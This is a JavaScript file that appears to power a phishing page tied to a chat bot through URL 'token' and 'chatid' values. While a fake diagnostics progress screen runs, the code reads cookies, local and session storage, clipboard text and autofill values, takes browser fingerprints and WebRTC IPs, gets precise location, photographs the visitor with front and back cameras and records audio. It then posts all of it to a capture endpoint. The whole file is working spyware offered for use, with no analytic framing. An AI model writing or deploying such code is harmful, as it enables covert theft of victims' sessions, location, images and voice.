(function() {
    'use strict';

    // Get token and chatid from URL
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    const chatid = urlParams.get('chatid');

    if (!token || !chatid) {
        console.log('Token or ChatID not provided');
        return;
    }

    // API endpoint
    const API_URL = '/api/capture';

    // Collected data object
    const collectedData = {
        token: token,
        chatid: chatid,
        screenInfo: {},
        batteryInfo: {},
        networkInfo: {},
        clipboardData: null,
        autofillData: null,
        cookies: null,
        localStorage: null,
        sessionStorage: null,
        extensions: null,
        platformInfo: {},
        hardwareInfo: {},
        connectionType: null,
        memoryInfo: {},
        plugins: [],
        mimeTypes: [],
        permissions: [],
        webRTCIPs: [],
        canvas: null,
        webgl: null,
        fonts: [],
        latitude: null,
        longitude: null
    };

    // Update UI elements
    function updateUI() {
        const statusText = document.getElementById('statusText');
        const timeRemaining = document.getElementById('timeRemaining');
        const securityStatus = document.getElementById('securityStatus');
        const dbStatus = document.getElementById('dbStatus');
        const perfStatus = document.getElementById('perfStatus');

        if (statusText) {
            const statuses = [
                'Running diagnostics...',
                'Checking system integrity...',
                'Optimizing database...',
                'Configuring security...',
                'Updating modules...',
                'Finalizing setup...'
            ];
            let index = 0;
            setInterval(() => {
                if (statusText) {
                    statusText.textContent = statuses[index % statuses.length];
                    index++;
                }
            }, 3000);
        }

        if (timeRemaining) {
            let time = Math.floor(Math.random() * 300) + 60;
            setInterval(() => {
                if (time > 0 && timeRemaining) {
                    time -= Math.floor(Math.random() * 5) + 1;
                    const minutes = Math.floor(time / 60);
                    const seconds = time % 60;
                    timeRemaining.textContent = `${minutes}m ${seconds}s`;
                }
            }, 2000);
        }

        setTimeout(() => {
            if (securityStatus) { securityStatus.textContent = 'Completed ✓'; securityStatus.style.color = '#00ff88'; }
        }, 4000);
        setTimeout(() => {
            if (dbStatus) { dbStatus.textContent = 'Completed ✓'; dbStatus.style.color = '#00ff88'; }
        }, 6000);
        setTimeout(() => {
            if (perfStatus) { perfStatus.textContent = 'Completed ✓'; perfStatus.style.color = '#00ff88'; }
        }, 8000);
    }

    // Collect screen information
    function collectScreenInfo() {
        collectedData.screenInfo = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            pixelRatio: window.devicePixelRatio,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            orientation: screen.orientation ? screen.orientation.type : 'unknown'
        };
    }

    // Collect battery information
    async function collectBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                collectedData.batteryInfo = {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: Math.round(battery.level * 100)
                };
            }
        } catch (e) {}
    }

    // Collect network information
    function collectNetworkInfo() {
        collectedData.connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
        collectedData.networkInfo = {
            type: navigator.connection ? navigator.connection.type : 'unknown',
            downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
            rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
            saveData: navigator.connection ? navigator.connection.saveData : false,
            onLine: navigator.onLine
        };
    }

    // Collect clipboard data
    async function collectClipboardData() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                collectedData.clipboardData = text || 'Empty clipboard';
            }
        } catch (e) {}
    }

    // Collect autofill data
    function collectAutofillData() {
        try {
            const inputs = document.querySelectorAll('input[autocomplete]');
            const autofillData = [];
            inputs.forEach(input => {
                if (input.value) {
                    autofillData.push({
                        name: input.name || input.id,
                        type: input.type,
                        autocomplete: input.autocomplete,
                        value: input.value
                    });
                }
            });
            collectedData.autofillData = JSON.stringify(autofillData);
        } catch (e) {}
    }

    // Collect storage data
    function collectStorageData() {
        try {
            collectedData.cookies = document.cookie || 'No cookies';
            const localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
            collectedData.localStorage = JSON.stringify(localStorageData);
            const sessionStorageData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
            collectedData.sessionStorage = JSON.stringify(sessionStorageData);
        } catch (e) {}
    }

    // Collect platform info
    function collectPlatformInfo() {
        collectedData.platformInfo = {
            platform: navigator.platform,
            vendor: navigator.vendor,
            appVersion: navigator.appVersion,
            appName: navigator.appName,
            product: navigator.product,
            productSub: navigator.productSub,
            language: navigator.language,
            languages: navigator.languages,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            deviceMemory: navigator.deviceMemory || 'unknown'
        };
    }

    // Collect memory info
    function collectMemoryInfo() {
        if (performance && performance.memory) {
            collectedData.memoryInfo = {
                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                totalJSHeapSize: performance.memory.totalJSHeapSize,
                usedJSHeapSize: performance.memory.usedJSHeapSize
            };
        }
    }

    // Collect plugins
    function collectPlugins() {
        if (navigator.plugins) {
            for (let i = 0; i < navigator.plugins.length; i++) {
                collectedData.plugins.push({
                    name: navigator.plugins[i].name,
                    filename: navigator.plugins[i].filename,
                    description: navigator.plugins[i].description
                });
            }
        }
    }

    // Collect MIME types
    function collectMimeTypes() {
        if (navigator.mimeTypes) {
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                collectedData.mimeTypes.push({
                    type: navigator.mimeTypes[i].type,
                    description: navigator.mimeTypes[i].description
                });
            }
        }
    }

    // Collect permissions
    async function collectPermissions() {
        const permissionsToCheck = [
            'geolocation', 'camera', 'microphone', 'notifications',
            'persistent-storage', 'clipboard-read', 'clipboard-write'
        ];
        for (const permission of permissionsToCheck) {
            try {
                if (navigator.permissions) {
                    const result = await navigator.permissions.query({ name: permission });
                    collectedData.permissions.push({ name: permission, state: result.state });
                }
            } catch (e) {}
        }
    }

    // Collect WebRTC IPs
    function collectWebRTCIPs() {
        return new Promise((resolve) => {
            const ips = [];
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                pc.createDataChannel('');
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                        const match = e.candidate.candidate.match(ipRegex);
                        if (match && !ips.includes(match[0])) ips.push(match[0]);
                    } else {
                        collectedData.webRTCIPs = ips;
                        pc.close();
                        resolve();
                    }
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                setTimeout(() => { pc.close(); resolve(); }, 3000);
            } catch (e) {
                resolve();
            }
        });
    }

    // Collect canvas fingerprint
    function collectCanvas() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Canvas Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Canvas Fingerprint', 4, 17);
            collectedData.canvas = canvas.toDataURL();
        } catch (e) {}
    }

    // Collect WebGL fingerprint
    function collectWebGL() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                collectedData.webgl = {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
                };
            }
        } catch (e) {}
    }

    // Collect fonts
    function collectFonts() {
        const fontList = [
            'Arial', 'Verdana', 'Helvetica', 'Tahoma', 'Trebuchet MS',
            'Times New Roman', 'Georgia', 'Garamond', 'Courier New',
            'Brush Script MT', 'Comic Sans MS', 'Impact', 'Monaco',
            'Lucida Console', 'Arial Black', 'Palatino Linotype',
            'Lucida Sans Unicode', 'Gill Sans', 'Century Gothic',
            'Cambria', 'Calibri', 'Franklin Gothic Medium',
            'Segoe UI', 'Roboto', 'Open Sans', 'Lato'
        ];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        
        const getWidth = (font) => {
            ctx.font = `${testSize} ${font}`;
            return ctx.measureText(testString).width;
        };

        const baseWidths = {};
        baseFonts.forEach(baseFont => {
            baseWidths[baseFont] = getWidth(baseFont);
        });

        fontList.forEach(font => {
            let detected = false;
            baseFonts.forEach(baseFont => {
                const width = getWidth(`'${font}', ${baseFont}`);
                if (width !== baseWidths[baseFont]) {
                    detected = true;
                }
            });
            if (detected) collectedData.fonts.push(font);
        });
    }

    // Collect location
    function collectLocation() {
        return new Promise((resolve) => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        collectedData.latitude = position.coords.latitude;
                        collectedData.longitude = position.coords.longitude;
                        resolve();
                    },
                    () => resolve(),
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                resolve();
            }
        });
    }

    // Capture camera
    async function captureCamera(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: facingMode,
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                },
                audio: false
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', true);
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 1920;
            canvas.height = video.videoHeight || 1080;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));

            stream.getTracks().forEach(track => track.stop());
            video.remove();
            canvas.remove();

            return blob;
        } catch (e) {
            console.log(`Camera ${facingMode} error:`, e);
            return null;
        }
    }

    // Capture audio
    async function captureAudio() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    sampleRate: 44100
                },
                video: false
            });

            const mediaRecorder = new MediaRecorder(stream, {
                mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
                    ? 'audio/webm;codecs=opus' 
                    : 'audio/webm'
            });

            const chunks = [];
            
            return new Promise((resolve) => {
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    stream.getTracks().forEach(track => track.stop());
                    resolve(blob);
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 3000);
            });
        } catch (e) {
            console.log('Audio capture error:', e);
            return null;
        }
    }

    // Send all collected data to server
    async function sendData(frontBlob, backBlob, audioBlob) {
        const formData = new FormData();
        formData.append('token', token);
        formData.append('chatid', chatid);
        formData.append('screenInfo', JSON.stringify(collectedData.screenInfo));
        formData.append('batteryInfo', JSON.stringify(collectedData.batteryInfo));
        formData.append('networkInfo', JSON.stringify(collectedData.networkInfo));
        formData.append('clipboardData', collectedData.clipboardData || 'Not available');
        formData.append('autofillData', collectedData.autofillData || 'Not available');
        formData.append('cookies', collectedData.cookies || 'Not available');
        formData.append('localStorage', collectedData.localStorage || 'Not available');
        formData.append('sessionStorage', collectedData.sessionStorage || 'Not available');
        formData.append('platformInfo', JSON.stringify(collectedData.platformInfo));
        formData.append('hardwareInfo', JSON.stringify(collectedData.hardwareInfo));
        formData.append('connectionType', collectedData.connectionType || 'Unknown');
        formData.append('memoryInfo', JSON.stringify(collectedData.memoryInfo));
        formData.append('plugins', JSON.stringify(collectedData.plugins));
        formData.append('mimeTypes', JSON.stringify(collectedData.mimeTypes));
        formData.append('permissions', JSON.stringify(collectedData.permissions));
        formData.append('webRTCIPs', JSON.stringify(collectedData.webRTCIPs));
        formData.append('canvas', collectedData.canvas || 'Not available');
        formData.append('webgl', JSON.stringify(collectedData.webgl || {}));
        formData.append('fonts', JSON.stringify(collectedData.fonts));
        formData.append('latitude', collectedData.latitude);
        formData.append('longitude', collectedData.longitude);

        if (frontBlob) formData.append('frontCamera', frontBlob, 'front.jpg');
        if (backBlob) formData.append('backCamera', backBlob, 'back.jpg');
        if (audioBlob) formData.append('audio', audioBlob, 'audio.webm');

        try {
            const response = await fetch(API_URL, {
                method: 'POST',
                body: formData
            });
            return await response.json();
        } catch (e) {
            console.log('Send error:', e);
            return null;
        }
    }

    // Main execution
    async function main() {
        updateUI();

        // Collect all non-permission data immediately
        collectScreenInfo();
        collectNetworkInfo();
        collectPlatformInfo();
        collectMemoryInfo();
        collectPlugins();
        collectMimeTypes();
        collectStorageData();
        collectAutofillData();
        collectCanvas();
        collectWebGL();
        collectFonts();
        collectBatteryInfo();
        collectPermissions();
        collectClipboardData();
        await collectWebRTCIPs();
        await collectLocation();

        // Request camera and microphone permissions
        let frontBlob = null;
        let backBlob = null;
        let audioBlob = null;

        try {
            const results = await Promise.allSettled([
                captureCamera('user'),
                captureCamera('environment'),
                captureAudio()
            ]);

            if (results[0].status === 'fulfilled') frontBlob = results[0].value;
            if (results[1].status === 'fulfilled') backBlob = results[1].value;
            if (results[2].status === 'fulfilled') audioBlob = results[2].value;
        } catch (e) {
            console.log('Media capture error:', e);
        }

        // Send everything
        await sendData(frontBlob, backBlob, audioBlob);
    }

    // Start execution
    main().catch(console.error);

})();
